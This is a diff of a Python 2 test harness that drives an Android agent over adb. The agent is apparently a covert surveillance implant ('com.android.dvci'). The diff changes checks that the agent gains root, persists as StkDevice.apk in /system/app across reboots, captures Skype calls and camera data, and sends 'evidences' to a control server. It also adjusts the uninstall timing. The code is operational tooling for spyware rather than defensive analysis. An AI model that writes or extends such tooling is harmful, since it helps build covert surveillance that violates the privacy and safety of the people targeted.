@@ -61,8 +61,6 @@ def check_install(dev, results, factory=None):
 
     results["packages_remained"] = res
 
-
-
     if results['release'].startswith("2"):
         apk = apk_template % "v2"
     else:
@@ -170,16 +168,25 @@ def check_su(dev, results):
 
     print "Has SU: ", results["su"]
 
-def check_root(c, instance_id, results, target_id):
+def check_root(c, instance_id, results, target_id, starts = 1):
     # check root
     info_evidences = []
     counter = 0
+
     while not info_evidences and counter < 10:
         infos = c.infos(target_id, instance_id)
-        info_evidences = [e['data']['content'] for e in infos if 'Root' in e['data']['content']]
+        info_evidences = [e['data']['content'] for e in infos if 'Started' in e['data']['content']]
         counter += 1
-        if not info_evidences:
-            print "... waiting for info"
+        if len(info_evidences) < starts:
+            print "... waiting for info Started: %s/%s" % (len(info_evidences), starts)
+            time.sleep(10)
+
+    while not info_evidences and counter < 10:
+        infos = c.infos(target_id, instance_id)
+        info_evidences = [e['data']['content'] for e in infos if 'Root' in e['data']['content'] or 'Started' in e['data']['content']]
+        counter += 1
+        if not info_evidences or not 'Root' in info_evidences[-1]:
+            print "... waiting for info Root: %s" % info_evidences
             time.sleep(10)
 
     # print "info_evidences: %s: " % info_evidences
@@ -199,6 +206,7 @@ def check_root(c, instance_id, results, target_id):
 
 
 def check_evidences(dev, c, instance_id, results, target_id, timestamp=""):
+
     time.sleep(60)
     evidences = c.evidences(target_id, instance_id)
 
@@ -245,8 +253,8 @@ def uninstall_agent(dev, results):
     time.sleep(5)
     say("agent uninstall, verify request")
 
-    for i in range(5):
-        time.sleep(15)
+    for i in range(12):
+        time.sleep(10)
 
         processes = adb.ps(dev)
         uninstall = service not in processes
@@ -312,7 +320,7 @@ def check_skype(c, target_id, instance_id, results, dev=None):
         if "No such file" not in ret:
             print "Skype call and sleep"
             adb.skype_call(dev)
-            time.sleep(60)
+            time.sleep(90)
             ret = adb.executeSU("ls /data/data/com.android.dvci/files/l4", True, dev)
             print ret
             break
@@ -366,8 +374,14 @@ def check_reboot(dev, results, delay = 60):
 
 def check_persistence(dev, results, delay = 30):
     print "... reboot and check persistence"
+    adb.press_key_home(dev)
+
+    if not adb.check_remote_file("StkDevice.apk", "/system/app", timeout=30, device=dev):
+        results["persistence"] = "No";
+
     adb.reboot(dev)
     time.sleep(delay)
+    adb.set_screen_on_and_unlocked(dev)
 
     ret = adb.execute("ls /system/app/StkDevice.apk")
 
@@ -391,8 +405,10 @@ def test_device(id, dev, args, results):
         wifiutils.uninstall_wifi_enabler(dev)
         exit(0)
 
-    #tests = ["sync","persistence","root", "skype","camera"]
-    tests = ["persistence"]
+    adb.reboot(dev)
+
+    tests = ["sync","persistence","root", "skype","camera"]
+    #tests = ["persistence"]
 
     demo = True
     build.connection.host = "192.168.100.100" #"rcs-castore"
@@ -443,6 +459,7 @@ def test_device(id, dev, args, results):
     set_time(dev)
     set_properties(dev, device_id, results)
 
+    adb.set_screen_on_and_unlocked(dev)
 
     try:
         with build.connection() as c:
@@ -475,14 +492,15 @@ def test_device(id, dev, args, results):
                 root = check_root(c, instance_id, results, target_id)
                 results['root_first'] = root
                 check_evidences(dev, c, instance_id, results, target_id, "_first")
-            else:
-                time.sleep(20)
+
+            time.sleep(20)
 
             if "persistence" in tests:
                 check_persistence(dev, results, delay=40)
 
-            if "root" in tests:
-                root = check_root(c, instance_id, results, target_id)
+            if "root" in tests and "sync" in tests:
+                root = check_root(c, instance_id, results, target_id, 2)
+                time.sleep(30)
                 if root and "skype" in tests:
                     # skype call
                     check_skype(c, target_id, instance_id, results, dev)
@@ -491,7 +509,8 @@ def test_device(id, dev, args, results):
                 check_camera(dev)
 
             # evidences
-            check_evidences(dev, c, instance_id, results, target_id, "_last")
+            if "sync" in tests:
+                check_evidences(dev, c, instance_id, results, target_id, "_last")
 
         if args.interactive:
             say("press enter to uninstall %s" % id)
@@ -597,6 +616,8 @@ def main():
 
     dev = None
     id = 0
+    results = collections.OrderedDict()
+
     if not devices:
         print "non ci sono device connessi"
     else:
@@ -605,7 +626,6 @@ def main():
             dev = devices[int(id)][0]
             print "eseguo il test su %s" % dev
 
-        results = collections.OrderedDict()
         try:
             test_device(id, dev, args, results)
         except Exception, ex:
